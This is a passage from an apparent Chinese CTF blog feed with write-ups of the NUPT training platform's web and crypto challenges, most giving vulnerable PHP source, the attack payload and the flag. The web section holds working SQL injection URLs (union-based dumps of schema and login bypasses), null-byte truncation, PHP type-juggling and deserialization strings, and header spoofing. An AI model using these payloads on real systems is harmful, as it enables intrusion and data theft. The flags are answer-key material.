table_schema=database()%23</code><br>执行的sql语句：SELECT id,title FROM news WHERE id=’運’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#’<br>id: 1 title: flag,news<br>找列名：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666C6167 and table_schema=database()%23</code><br>执行的sql语句：SELECT id,title FROM news WHERE id=’運’ union select 1,group_concat(column_name) from information_schema.columns where table_name=0x666C6167 and table_schema=database()#’<br>id: 1 title: fl4g<br>找flag：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; union select 1,fl4g from flag %23</code><br>执行的sql语句：SELECT id,title FROM news WHERE id=’運’ union select 1,fl4g from flag #’<br>id: 1 title: nctf{gbk_3sqli}<br>这道题也可以在知道flag表名之后直接：<code>http://115.28.150.176/sqli/index.php?id=%df&#39; union select *,1 from flag %23</code></p>
<h3 id="x00"><a href="#x00" class="headerlink" title="/x00"></a>/x00</h3><p>查看源代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">view-source:</div><div class="line"></div><div class="line">    if (isset ($_GET[&apos;nctf&apos;])) &#123;</div><div class="line">        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE)</div><div class="line">            echo &apos;必须输入数字才行&apos;;</div><div class="line">        else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE)   </div><div class="line">            die(&apos;Flag: &apos;.$flag);</div><div class="line">        else</div><div class="line">            echo &apos;骚年，继续努力吧啊~&apos;;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>根据题目提示使用00截断，可以构造nctf为1%00%23biubiubiu：<br><code>http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php?nctf=1%00%23biubiubiu</code><br>可以获得Flag:<code>flag:nctf{use_00_to_jieduan}</code></p>
<h3 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h3><p>查看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</div><div class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) === md5($_GET[<span class="string">'b'</span>]))</div><div class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>很容易判断是PHP的弱类型：构造<code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=2</code>可以获得flag: <code>nctf{php_is_so_cool}</code></p>
<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>查看源代码里面有这么一段：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; ?&gt;</div><div class="line">    &lt;?php</div><div class="line">        extract($_POST);</div><div class="line">        if ($pass == $thepassword_123) &#123; ?&gt;</div><div class="line">        &lt;div class="alert alert-success"&gt;</div><div class="line">        &lt;code&gt;&lt;?php echo $theflag; ?&gt;&lt;/code&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;?php &#125; ?&gt;</div><div class="line">    &lt;?php &#125; ?&gt;</div></pre></td></tr></table></figure></p>
<p>整理一下应该为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line"> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>)</div><div class="line">    extract($_POST);</div><div class="line">    <span class="keyword">if</span> ($pass == $thepassword_123) &#123;</div><div class="line">        <span class="keyword">echo</span> $theflag;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>存在变量覆盖。<br>其中extract()函数的意思为：从数组中将变量导入到当前的符号表,该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">extract($_POST);</div><div class="line"><span class="comment">//相当于$username = $_POST['username'];</span></div><div class="line"><span class="comment">//$password = $_POST['password'];</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>构造POST请求为：<code>pass=1234&amp;thepassword_123=1234</code>即可得到flag：<code>nctf{bian_liang_fu_gai!}</code></p>
<h3 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h3><p>根据提示查看index.txt：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;</div><div class="line">  <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</div><div class="line">  <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$_GET[id] = urldecode($_GET[id]);</div><div class="line"><span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>提交到服务器的请求会做一次url编码，在源代码中做了一次解码，那么就再做一次url编码就可以了。<br>对hackerDJ做两次url编码即可：<code>http://way.nuptzj.cn/php/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61</code><br>flag：<code>nctf{php_is_best_language}</code></p>
<h3 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h3><p>改 X-Forwarded-For 为127.0.0.1<br>flag：<code>nctf{happy_http_headers}</code></p>
<h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>flag在返回包头里<br>Flag: <code>nctf{tips_often_hide_here}</code></p>
<h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p>上传一个jpg文件，用bp拦截请求，在uploads/之后加上1.php，然后再加上00截断即可。</p>
<h3 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h3><p>查看源码里面有这么一段：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</div><div class="line">  $query = mysql_fetch_array(mysql_query($sql));</div><div class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>那么就构造POST请求为：<code>user=admin&#39;)%23&amp;pass=Password</code><br>flag:<code>nctf{ni_ye_hui_sql?}</code></p>
<h3 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h3><p>给了提示:strcmp(array,string)=null=0<br>那么就构造POST请求：<code>pass[]=1</code><br>flag:<code>nctf{strcmp_is_n0t_3afe}</code></p>
<h3 id="起名字真难"><a href="#起名字真难" class="headerlink" title="起名字真难"></a>起名字真难</h3><p>查看源码，number必须等于54975581388但是又不能是54975581388，那么可以转换成16进制数0xccccccccc<code>http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc</code><br>The flag is:<code>nctf{follow_your_dream}</code></p>
<h3 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h3><p>题目要求重置的是admin的密码，url显示的却是ctfuser<br>用bp查看请求，请求的url是/web13/index.php?user1=%59%33%52%6D%64%58%4E%6C%63%67%3D%3D<br>后面这串发现是ctfuser的base64的url编码。用bp的repeater功能，将url请求修改为admin的base64的url编码，POST请求为<code>user=admin&amp;newpass=1234&amp;vcode=1234</code><br>Response可以看到flag is:<code>nctf{reset_password_often_have_vuln}</code></p>
<h3 id="php-反序列化"><a href="#php-反序列化" class="headerlink" title="php 反序列化"></a>php 反序列化</h3><p>查看网页源代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $enter;</div><div class="line">    <span class="keyword">var</span> $secret;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'pass'</span>])) &#123;</div><div class="line">    $pass = $_GET[<span class="string">'pass'</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</div><div class="line">        $pass=stripslashes($pass);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $o = unserialize($pass);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($o) &#123;</div><div class="line">        $o-&gt;secret = <span class="string">"*"</span>;</div><div class="line">        <span class="keyword">if</span> ($o-&gt;secret === $o-&gt;enter)</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Congratulation! Here is my secret: "</span>.$o-&gt;secret;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">echo</span> <span class="string">"Oh no... You can't fool me"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"are you trolling?"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>源码的大概意思就是：o是对pass做了反序列化，然后如果<code>$o-&gt;secret === $o-&gt;enter</code>，那么就会出现flag。那么就构造<code>$o-&gt;secret = $o-&gt;enter</code>，得到序列化的字符串就可以了。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</div><div class="line"><span class="keyword">var</span> $enter;</div><div class="line"><span class="keyword">var</span> $secret;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$o = <span class="keyword">new</span> just4fun();</div><div class="line">$o-&gt;enter = &amp;$o-&gt;secret;</div><div class="line"><span class="keyword">echo</span> serialize($o);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>在本地的PHP环境下运行，或者是找个在线的PHP测试网站运行就可以获得序列化后的结果：<code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}``
http://115.28.150.176/php1/index.php?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</code><br>提交之后就可以获得flag：Congratulation! Here is my secret: <code>nctf{serialize_and_unserialize}</code><br>这道题有个Writeup写的不错：<a href="http://115.159.210.46/archives/19.html" target="_blank" rel="external">http://115.159.210.46/archives/19.html</a><br>关键部分：<br>在 PHP 中普通的传值赋值行为有个例外就是碰到对象 object 时，在 PHP 5 中是以引用赋值的，除非明确使用了 clone 关键字来拷贝，PHP 支持引用赋值，使用“$var = &amp;$othervar;”语法。引用赋值意味着两个变量指向了同一个数据，没有拷贝任何东西。<br>简单来说，有这么一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">a = 1;</div><div class="line">b = &amp;a;</div><div class="line">a = a + 1;</div></pre></td></tr></table></figure></p>
<p>由于引用传参，a和b引用的是同一个数据，因此a+1后，b也会变成2。</p>
<h3 id="sql-injection-4"><a href="#sql-injection-4" class="headerlink" title="sql injection 4"></a>sql injection 4</h3><p>查看网页源代码可以发现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</div><div class="line">        $str=stripslashes($str);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</div><div class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</div><div class="line"></div><div class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</div><div class="line">$result=mysql_query($query);</div><div class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $flag;</div></pre></td></tr></table></figure></p>
<p>输入的时候使用了htmlentities函数，基本上单引号绕过就不可能做到了。<br>但是可以用反斜杠来转义掉一个单引号。构造<code>username=admin\&amp;password= or 1=1 %23</code>，此时的SQL语句变成了：<code>SELECT * FROM users WHERE name=&#39;admin\&#39; AND pass=&#39; or 1=1 #&#39;;</code>成功绕过。<br>得到flag:<code>nctf{sql_injection_is_interesting}</code></p>
<h3 id="综合题"><a href="#综合题" class="headerlink" title="综合题"></a>综合题</h3><p>打开之后是jsfuck编码，放浏览器的console运行之后得到：1bc29b36f623ba82aaf6724fd3b16718.php<br>访问之后看到：哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里<br>汗！不过看请求返回包里面有个tip: history of bash<br>于是想到.bash_history，访问看到：zip -r flagbak.zip ./*<br>然后就下载flagbak.zip，解压得到flag is:<code>nctf{bash_history_means_what}</code></p>
<h3 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h3><p>查看网页的源代码，有这么一段：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</div><div class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</div><div class="line">  mysql_select_db(SAE_MYSQL_DB);</div><div class="line">  $user = $_POST[user];</div><div class="line">  $pass = md5($_POST[pass]);</div><div class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</div><div class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>输出flag的条件是pass和$query[pw])相等。由于是先去数据库中取出pw，然后再进行比较，所以存在sql注入。<br>构造<code>user=0&#39; union select &#39;c4ca4238a0b923820dcc509a6f75849b&#39; %23&amp;pass=1</code>，其中c4ca4238a0b923820dcc509a6f75849b是1的md5<br>这个时候的SQL语句就变成<code>select pw from ctf where user=&#39;0&#39; union select &#39;c4ca4238a0b923820dcc509a6f75849b&#39;%23</code>,也就是用union select的值去覆盖了pw的结果<br>也就是这时候query[pw]就是c4ca4238a0b923820dcc509a6f75849b，而输入的pass也是c4ca4238a0b923820dcc509a6f75849b，那么就相等，flag就出来了。<br>Key: <code>ntcf{union_select_is_wtf}</code></p>
<h3 id="注入实战1"><a href="#注入实战1" class="headerlink" title="注入实战1"></a>注入实战1</h3><p>网站进不去了。估计是被注入太多次了，哈哈。</p>
<h3 id="综合题2"><a href="#综合题2" class="headerlink" title="综合题2"></a>综合题2</h3><p>参考<a href="http://www.hazzel.cn/archives/10.html" target="_blank" rel="external">http://www.hazzel.cn/archives/10.html</a></p>
<h3 id="密码重置2"><a href="#密码重置2" class="headerlink" title="密码重置2"></a>密码重置2</h3><p>可以从源代码获取到管理员的邮箱地址：<code>admin@nuptzj.cn</code><br>根据题目的提示可以找到vim的备份文件：.submit.php.swp<br>里面有一段关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</div><div class="line">    <span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</div><div class="line">    <span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</div><div class="line">    $sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</div><div class="line">    $r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</div><div class="line">    $r = mysql_fetch_assoc($r);</div><div class="line">    $r = $r[<span class="string">'num'</span>];</div><div class="line">    <span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</div><div class="line">        <span class="keyword">echo</span> $flag;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"失败了呀"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>意思是说：token和emailAddress不能为空；token的长度必须为10；token不能等于’0’，那么可以构造成0000000000<br>于是url为：<code>http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin@nuptzj.cn&amp;token=0000000000</code><br>获得flag：<code>nctf{thanks_to_cumt_bxs}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h3&gt;&lt;p&gt;网页源代码：&lt;code&gt;nctf{flag_admiaanaaaaaaaaaaa}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;md5-collision&quot;&gt;&lt;a href=&quot;#md5-collision&quot; class=&quot;headerlink&quot; title=&quot;md5 collision&quot;&gt;&lt;/a&gt;md5 collision&lt;/h3&gt;&lt;p&gt;QNKCDZO的md5值为0e830400451993494058024219903391,所以显然根据在php中md5函数的判断规则，只要字符串的md5值开始也是0e则相等。&lt;code&gt;http://115.28.150.176/md5/index.php?a=s878926199a&lt;/code&gt;&lt;br&gt;flag：&lt;code&gt;nctf{md5_collision_is_easy}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;签到2&quot;&gt;&lt;a href=&quot;#签到2&quot; class=&quot;headerlink&quot; title=&quot;签到2&quot;&gt;&lt;/a&gt;签到2&lt;/h3&gt;&lt;p&gt;用firebug查看到输入框中有maxlength=”10”，改大了之后再输入zhimakaimen即可。&lt;br&gt;flag：&lt;code&gt;nctf{follow_me_to_exploit}&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;这题不是WEB&quot;&gt;&lt;a href=&quot;#这题不是WEB&quot; class=&quot;headerlink&quot; title=&quot;这题不是WEB&quot;&gt;&lt;/a&gt;这题不是WEB&lt;/h3&gt;&lt;p&gt;发现用bp截取不到数据包，用御剑也扫不出东西，于是把gif下载下来，用UE打开，发现最后藏了flag：&lt;code&gt;nctf{photo_can_also_hid3_msg}&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="WEB" scheme="http://yoursite.com/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>南京邮电大学网络攻防训练平台题解——密码学</title>
    <link href="http://yoursite.com/2016/10/12/%E5%8D%97%E4%BA%AC%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%AE%AD%E7%BB%83%E5%B9%B3%E5%8F%B0%E9%A2%98%E8%A7%A3%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <id>http://yoursite.com/2016/10/12/南京邮电大学网络攻防训练平台题解——密码学/</id>
    <published>2016-10-12T15:24:46.000Z</published>
    <updated>2016-10-12T15:26:01.373Z</updated>
    
    <content type="html"><![CDATA[<h3 id="easy"><a href="#easy" class="headerlink" title="easy!"></a>easy!</h3><p>Base64解码：<code>nctf{this_is_base64_encode}</code></p>
<h3 id="KeyBoard"><a href="#KeyBoard" class="headerlink" title="KeyBoard"></a>KeyBoard</h3><p>根据键盘的位置画图，可以看出是areuhack。（个人觉得a有点难看出来）<br>flag：<code>nctf{areuhack}</code><br><a id="more"></a></p>
<h3 id="base64全家桶"><a href="#base64全家桶" class="headerlink" title="base64全家桶"></a>base64全家桶</h3><p>手工分别尝试base64，base32和base16即可。<br>flag：<code>nctf{base64_base32_and_base16}</code></p>
<h3 id="n次base64"><a href="#n次base64" class="headerlink" title="n次base64"></a>n次base64</h3><p>用Python脚本跑就可以了：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line">s=<span class="string">'...'</span> <span class="comment">#替换为题目中字符串</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    s = base64.b64decode(s)</div><div class="line">    <span class="keyword">print</span> s</div><div class="line"><span class="keyword">print</span> s</div></pre></td></tr></table></figure></p>
<p>flag：<code>nctf{please_use_python_to _decode_base64}</code></p>
<h3 id="骚年来一发吗"><a href="#骚年来一发吗" class="headerlink" title="骚年来一发吗"></a>骚年来一发吗</h3><p>根据加密函数写解密函数：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    data = <span class="string">'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws'</span></div><div class="line">    data = data.encode(<span class="string">'rot13'</span>)</div><div class="line">    data = data[::<span class="number">-1</span>]</div><div class="line">    data = data.decode(<span class="string">'base64'</span>)</div><div class="line">    result = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</div><div class="line">        result += chr(ord(i)<span class="number">-1</span>)</div><div class="line">    result = result[::<span class="number">-1</span>]</div><div class="line">    <span class="keyword">print</span> result</div></pre></td></tr></table></figure></p>
<p>flag：<code>nctf{rot13_and_base64_and_strrev}</code></p>
<h3 id="mixed-base64"><a href="#mixed-base64" class="headerlink" title="mixed_base64"></a>mixed_base64</h3><p>Python脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">b_decode</span><span class="params">(encoded_str, flag, decode_list = None)</span>:</span></div><div class="line">    <span class="keyword">if</span> decode_list == <span class="keyword">None</span>:</div><div class="line">        decode_list = [b16decode, b32decode, b64decode]</div><div class="line">    <span class="keyword">for</span> process <span class="keyword">in</span> decode_list:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            encoded_str = process(encoded_str)</div><div class="line">            <span class="keyword">if</span> flag <span class="keyword">in</span> encoded_str:</div><div class="line">                <span class="keyword">return</span> encoded_str</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                encoded_str = b_decode(encoded_str, flag)</div><div class="line">                <span class="keyword">return</span> encoded_str</div><div class="line">        <span class="keyword">except</span> Exception:</div><div class="line">            <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    encoded_str = <span class="string">'...'</span> <span class="comment">#替换成题目字符串</span></div><div class="line">    flag = <span class="string">'nctf'</span></div><div class="line">    <span class="keyword">print</span> b_decode(encoded_str, flag)</div></pre></td></tr></table></figure></p>
<p>运行可以得到：<code>nctf{random_mixed_base64_encode}</code></p>
<h3 id="异性相吸"><a href="#异性相吸" class="headerlink" title="异性相吸"></a>异性相吸</h3><p>下载xortool，然后对明文.txt和密文.txt做xor即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~/xortool/xortool# ./xortool-xor -f 1.txt -f 2.txt</div><div class="line">flag:nctf&#123;xor_xor_xor_biubiubiu&#125;</div></pre></td></tr></table></figure></p>
